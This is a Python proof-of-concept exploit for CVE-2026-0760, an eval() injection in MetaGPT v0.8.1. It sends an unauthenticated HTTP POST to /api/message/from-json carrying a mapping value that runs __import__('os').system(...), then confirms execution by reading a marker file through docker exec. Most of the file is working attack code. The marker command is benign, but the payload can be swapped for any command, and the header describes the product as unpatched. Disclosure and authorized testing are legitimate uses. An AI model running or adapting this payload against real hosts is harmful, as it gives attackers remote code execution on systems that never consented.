#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : MetaGPT eval() RCE via actionoutput_str_to_mapping()
# CVE            : CVE-2026-0760
# Vendor         : deepwisdom (Foundation Agents)
# Product        : MetaGPT
# Affected       : v0.8.1 and all prior versions (UNPATCHED)
# Type           : CWE-95 - Improper Neutralization of Directives in
#                  Dynamically Evaluated Code ('eval Injection')
# CVSS           : 9.8 (Critical)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-0760 — Vector 2: eval() RCE via HTTP (Network Exploit)

Demonstrates the SECONDARY code execution path in MetaGPT v0.8.1 via eval()
in actionoutput_str_to_mapping() — a different code path from the primary
pickle.loads() vulnerability.

ATTACK CHAIN:
  1. Send a JSON mapping to /api/message/from-json
  2. Server passes mapping to actionoutput_str_to_mapping()
  3. eval() is called on each mapping value — arbitrary code execution

PREREQUISITES:
  - Network access to MetaGPT HTTP API (default port 8080)
  - No authentication required

REFERENCES:
  - CVE-2026-0760
  - https://www.zerodayinitiative.com/advisories/ZDI-26-026/

Usage:
    python3 poc_vector2_eval.py <target_host> <target_port> <container_name>
    python3 poc_vector2_eval.py localhost 8080 cve-2026-0760-vulnerable
"""

import sys
import json
import time
import http.client
import subprocess


MARKER_FILE = "/tmp/cve-2026-0760-eval-proof.txt"


def send_eval_payload(target_host, target_port, payload_expr):
    """Send a malicious mapping to /api/message/from-json triggering eval().

    Args:
        target_host: Target IP/hostname
        target_port: Target port
        payload_expr: Python expression to be eval()'d by the server

    Returns:
        tuple: (status_code, response_body)
    """
    body = json.dumps({
        "mapping": {
            "field1": payload_expr
        }
    })

    try:
        conn = http.client.HTTPConnection(target_host, target_port, timeout=10)
        conn.request(
            "POST",
            "/api/message/from-json",
            body=body,
            headers={"Content-Type": "application/json"}
        )
        response = conn.getresponse()
        status = response.status
        resp_body = response.read().decode('utf-8', errors='replace')
        conn.close()
        return status, resp_body
    except Exception as e:
        return None, str(e)


def verify_rce_via_docker(container_name):
    """Verify RCE by checking the marker file inside the container."""
    try:
        result = subprocess.run(
            ["docker", "exec", container_name, "cat", MARKER_FILE],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0 and result.stdout.strip():
            return True, result.stdout.strip()
        return False, result.stderr.strip()
    except Exception as e:
        return False, str(e)


def cleanup_marker(container_name):
    """Remove previous proof artifacts."""
    try:
        subprocess.run(
            ["docker", "exec", container_name, "rm", "-f", MARKER_FILE],
            capture_output=True, timeout=5
        )
    except Exception:
        pass


def exploit(target_host, target_port, container_name):
    """Run the eval() RCE exploit over HTTP."""
    print("=" * 70)
    print("  CVE-2026-0760 — MetaGPT eval() RCE via actionoutput_str_to_mapping()")
    print("  Vector: HTTP POST to /api/message/from-json (CWE-95)")
    print("=" * 70)
    print()

    # -----------------------------------------------------------------------
    # Step 1: Check target health
    # -----------------------------------------------------------------------
    print(f"[*] Target: http://{target_host}:{target_port}")
    print("[*] Step 1: Checking target health...")

    try:
        conn = http.client.HTTPConnection(target_host, target_port, timeout=5)
        conn.request("GET", "/health")
        resp = conn.getresponse()
        health = json.loads(resp.read())
        conn.close()

        if health.get("vulnerable"):
            print("[+] Target is UP — vulnerable service confirmed")
        else:
            print("[-] Target responded but 'vulnerable' flag not set")
    except Exception as e:
        print(f"[-] Cannot reach target: {e}")
        sys.exit(1)

    # -----------------------------------------------------------------------
    # Step 2: Clean up previous artifacts
    # -----------------------------------------------------------------------
    print("[*] Step 2: Cleaning up previous proof artifacts...")
    cleanup_marker(container_name)

    # -----------------------------------------------------------------------
    # Step 3: Craft the eval() payload
    # -----------------------------------------------------------------------
    print("[*] Step 3: Crafting eval() RCE payload...")
    rce_command = f"id > {MARKER_FILE} && echo EVAL_RCE >> {MARKER_FILE} && whoami >> {MARKER_FILE}"
    payload_expr = f"__import__('os').system('{rce_command}')"
    print(f"    eval() expression: {payload_expr}")
    print()
    print("    The server calls actionoutput_str_to_mapping() on our mapping,")
    print("    which iterates over values and calls eval() on each one.")

    # -----------------------------------------------------------------------
    # Step 4: Send the exploit via HTTP
    # -----------------------------------------------------------------------
    print()
    print("[*] Step 4: Sending payload to /api/message/from-json...")
    status, resp_body = send_eval_payload(target_host, target_port, payload_expr)

    if status is None:
        print(f"[-] HTTP request failed: {resp_body}")
        sys.exit(1)

    print(f"    HTTP response: {status}")
    if status == 200:
        print("    [+] HTTP 200 — eval() executed and returned successfully")
    elif status == 500:
        print("    [+] HTTP 500 — eval() executed; error during result processing")
    else:
        print(f"    [?] Unexpected status code: {status}")

    try:
        resp_json = json.loads(resp_body)
        print(f"    Response: {json.dumps(resp_json, indent=6)}")
    except json.JSONDecodeError:
        print(f"    Response: {resp_body[:200]}")

    # -----------------------------------------------------------------------
    # Step 5: Verify RCE
    # -----------------------------------------------------------------------
    print()
    print("[*] Step 5: Verifying RCE — checking marker file in container...")
    time.sleep(0.5)

    success, content = verify_rce_via_docker(container_name)

    if success:
        print("[+] ╔══════════════════════════════════════════════════════╗")
        print("[+] ║  EVAL RCE CONFIRMED — SECONDARY VECTOR EXPLOITED     ║")
        print("[+] ╚══════════════════════════════════════════════════════╝")
        print("[+]")
        print(f"[+] Marker file contents ({MARKER_FILE}):")
        for line in content.split('\n'):
            print(f"[+]   {line}")
        print()
        print("[+] This proves that MetaGPT's actionoutput_str_to_mapping()")
        print("[+] calls eval() on user-controlled mapping values over HTTP,")
        print("[+] providing a second RCE path independent of pickle.loads().")
    else:
        print("[-] ╔══════════════════════════════════════════════════════╗")
        print("[-] ║  VERIFICATION FAILED — marker file not found         ║")
        print("[-] ╚══════════════════════════════════════════════════════╝")
        print(f"[-] Error: {content}")
        sys.exit(1)

    print()
    print("=" * 70)
    print("  Exploit completed successfully.")
    print("=" * 70)


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    container = sys.argv[3] if len(sys.argv) > 3 else "cve-2026-0760-vulnerable"

    exploit(target, port, container)
